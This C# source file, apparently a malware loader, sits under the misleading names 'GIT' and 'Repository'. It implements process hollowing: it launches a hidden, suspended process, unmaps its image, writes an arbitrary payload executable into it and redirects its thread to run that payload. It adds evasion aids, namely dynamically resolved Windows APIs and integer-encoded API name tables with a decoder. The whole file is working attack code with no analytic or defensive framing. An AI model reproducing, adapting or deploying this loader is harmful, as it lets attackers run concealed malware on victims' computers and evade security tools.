using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using System.Collections.Generic;

namespace GIT
{
    public sealed class Repository
    {
        public static void Execute(string path, byte[] payload)
        {
            for (int i = 0; i < 5; i++)
            {
                int readWrite = 0x0;
                NativeMethods.StartupInformation si = new NativeMethods.StartupInformation();
                NativeMethods.ProcessInformation pi = new NativeMethods.ProcessInformation();
                si.Size = (UInt32)(Marshal.SizeOf(typeof(NativeMethods.StartupInformation))); //Attention !

                try
                {
                    bool createProc = NativeMethods.CreateProcessA(path, "", IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi);
                    if (!createProc)
                    {
                        throw new Exception();
                    }

                    int fileAddress = BitConverter.ToInt32(payload, 0x3C);
                    int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);
                    int[] context = new int[0xB3];
                    context[0] = 0x10002;
                    if (IntPtr.Size == 0x4)
                    {
                        bool getThreadContext = NativeMethods.GetThreadContext(pi.ThreadHandle, context);
                        if (!getThreadContext)
                        {
                            throw new Exception();
                        }
                    }
                    else
                    {
                        bool wow64GetThreadContext = NativeMethods.Wow64GetThreadContext(pi.ThreadHandle, context);
                        if (!wow64GetThreadContext)
                        {
                            throw new Exception();
                        }
                    }

                    int ebx = context[0x29];
                    int baseAddress = 0;
                    bool readProcessMemory = NativeMethods.ReadProcessMemory(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite);
                    if (!readProcessMemory)
                    {
                        throw new Exception();
                    }
                    if (imageBase == baseAddress)
                    {
                        if (NativeMethods.ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0)
                        {
                            throw new Exception();
                        }
                    }

                    int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
                    int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);
                    bool allowOverride = false;
                    int newImageBase = NativeMethods.VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);

                    if (newImageBase == 0)
                    {
                        throw new Exception();
                    }
                    bool writeProcessMemory = NativeMethods.WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite);
                    if (!writeProcessMemory)
                    {
                        throw new Exception();
                    }

                    int sectionOffset = fileAddress + 0xF8;
                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 0x6);
                    for (int k = 0; k < numberOfSections; k++)
                    {
                        int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xC);
                        int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                        int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);
                        if (sizeOfRawData != 0)
                        {
                            byte[] sectionData = new byte[sizeOfRawData];
                            Array.Copy(payload, pointerToRawData, sectionData, 0, sectionData.Length);
                            bool writeProcesssMemory = NativeMethods.WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite);
                            if (!writeProcesssMemory)
                            {
                                throw new Exception();
                            }
                        }
                        sectionOffset += 0x28;
                    }

                    byte[] pointerData = BitConverter.GetBytes(newImageBase);
                    bool writesProcessMemory = NativeMethods.WriteProcessMemory(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite);
                    if (!writesProcessMemory)
                    {
                        throw new Exception();
                    }
                    int addressOfEntryPoint = BitConverter.ToInt32(payload, fileAddress + 0x28);
                    if (allowOverride)
                    {
                        newImageBase = imageBase;
                    }
                    context[0x2C] = newImageBase + addressOfEntryPoint;

                    if (IntPtr.Size == 0x4)
                    {
                        bool setThreadContext = NativeMethods.SetThreadContext(pi.ThreadHandle, context);
                        if (!setThreadContext)
                        {
                            throw new Exception();
                        }
                    }
                    else
                    {
                        bool wow64SetThreadContext = NativeMethods.Wow64SetThreadContext(pi.ThreadHandle, context);
                        if (!wow64SetThreadContext)
                        {
                            throw new Exception();
                        }
                    }
                    if (NativeMethods.ResumeThread(pi.ThreadHandle) == (int)(-1 + 0 + 0)) throw new Exception();
                }
                catch (Exception)
                {
                    Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
                    continue;
                }
                break;
            }
        }
    }

    public sealed class Decode
    {
        internal static byte[] IntegerToBytes(int[] iData, string sKey)
        {
            List<byte> dataBuffer = new List<byte>();
            for (int i = 0; i < iData.Length; i++)
            {
                int ascwKey = Strings.AscW(sKey);
                int deBuff = iData[i] / (sKey.Length ^ 128);
                byte decData = (byte)(deBuff - ((ascwKey * 256) | 128 % 32));
                dataBuffer.Add(decData);
            }
            return (byte[])dataBuffer.ToArray();
        }

        internal static string BytesToString(byte[] Data)
        {
            return Encoding.UTF8.GetString(Data, 0, Data.Length);
        }
    }

    public struct Helper
    {
        public static int[] Kernel32 = new int[] { 3105607, 3104713, 3106650, 3106054, 3104713, 3105756, 3097263, 3097114 };
        public static int[] NtDLL = new int[] { 3106054, 3106948, 3104564, 3105756, 3105756 };

        public static int[] ResumeThread = new int[] { 3101882, 3104713, 3106799, 3107097, 3105905, 3104713, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564 };
        public static int[] Wow64SetThreadContext = new int[] { 3102627, 3106203, 3107395, 3097710, 3097412, 3102031, 3104713, 3106948, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948 };
        public static int[] SetThreadContext = new int[] { 3102031, 3104713, 3106948, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948 };
        public static int[] Wow64GetThreadContext = new int[] { 3102627, 3106203, 3107395, 3097710, 3097412, 3100243, 3104713, 3106948, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948 };
        public static int[] GetThreadContext = new int[] { 3100243, 3104713, 3106948, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948 };
        public static int[] VirtualAllocEx = new int[] { 3102478, 3105309, 3106650, 3106948, 3107097, 3104117, 3105756, 3099349, 3105756, 3105756, 3106203, 3104415, 3099945, 3107544 };
        public static int[] WriteProcessMemory = new int[] { 3102627, 3106650, 3105309, 3106948, 3104713, 3101584, 3106650, 3106203, 3104415, 3104713, 3106799, 3106799, 3101137, 3104713, 3105905, 3106203, 3106650, 3107693 };
        public static int[] ReadProcessMemory = new int[] { 3101882, 3104713, 3104117, 3104564, 3101584, 3106650, 3106203, 3104415, 3104713, 3106799, 3106799, 3101137, 3104713, 3105905, 3106203, 3106650, 3107693 };
        public static int[] ZwUnmapViewOfSection = new int[] { 3103074, 3107395, 3102329, 3106054, 3105905, 3104117, 3106352, 3102478, 3105309, 3104713, 3107395, 3101435, 3104862, 3102031, 3104713, 3104415, 3106948, 3105309, 3106203, 3106054 };
        public static int[] CreateProcessA = new int[] { 3099647, 3106650, 3104713, 3104117, 3106948, 3104713, 3101584, 3106650, 3106203, 3104415, 3104713, 3106799, 3106799, 3099349 };
    }

    public abstract class NativeMethods
    {
        private const string Key = "QoMn4OhGfV+oHNb8AzV==";

        public delegate int DelegateResumeThread(IntPtr handle);
        public delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);
        public delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);
        public delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);
        public delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);
        public delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        public delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        public delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        public delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);
        public delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
        bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);

        public static readonly DelegateResumeThread ResumeThread = LoadApi<DelegateResumeThread>("kernel32", "ResumeThread");
        public static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");
        public static readonly DelegateSetThreadContext SetThreadContext = LoadApi<DelegateSetThreadContext>("kernel32", "SetThreadContext");
        public static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi<DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");
        public static readonly DelegateGetThreadContext GetThreadContext = LoadApi<DelegateGetThreadContext>("kernel32", "GetThreadContext");
        public static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");
        public static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");
        public static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi<DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");
        public static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi<DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");
        public static readonly DelegateCreateProcessA CreateProcessA = LoadApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");





        [StructLayout(LayoutKind.Sequential, Pack = (int)(8 - 7))]
        public struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = (int)(0 + 0 + 1))]
        public struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        private static CreateApi LoadApi<CreateApi>(string name, string method)
        {
            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
        }
    }
}